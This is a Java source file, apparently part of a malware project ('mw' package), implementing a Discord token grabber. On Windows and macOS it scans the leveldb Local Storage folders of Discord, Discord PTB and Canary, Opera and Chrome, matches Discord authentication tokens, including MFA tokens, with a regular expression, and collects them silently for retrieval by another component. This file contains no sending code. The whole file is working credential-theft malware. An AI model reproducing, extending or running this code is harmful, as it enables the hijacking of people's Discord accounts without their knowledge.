package me.koenv.mw.discord;

import me.koenv.mw.DesktopInfo;
import me.koenv.mw.Main;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Tokens {

    private static final Main main = Main.getMain();
    private static final DesktopInfo DI = Main.getDesktopInfo();
    private final StringBuilder sb = new StringBuilder();

    public void run() {
        if (DI.getOs_name().contains("Windows")){
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            int cx = 0;

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathNames = f.list();
                    if (pathNames == null) continue;

                    for (String pathname : pathNames) {
                        try {
                            FileInputStream fStream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fStream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        sb.append("\n");
                                    }
                                    sb.append(" ").append(m.group());
                                    cx++;
                                }
                            }
                        } catch (Exception ignored) {
                        }
                    }
                }
            } catch (Exception ignored) { }
        } else if (DI.getOs_name().contains("Mac")) {

            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");

            int cx = 0;
            sb.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathNames = f.list();
                    if (pathNames == null) continue;

                    for (String pathname : pathNames) {
                        try {
                            FileInputStream fStream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fStream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        sb.append("\n");
                                    }
                                    sb.append(" ").append(m.group());
                                    cx++;
                                }
                            }
                        } catch (Exception ignored) {
                        }
                    }
                }
            } catch (Exception ignored) { }
        }
    }

    public StringBuilder getSb() {
        return sb;
    }
}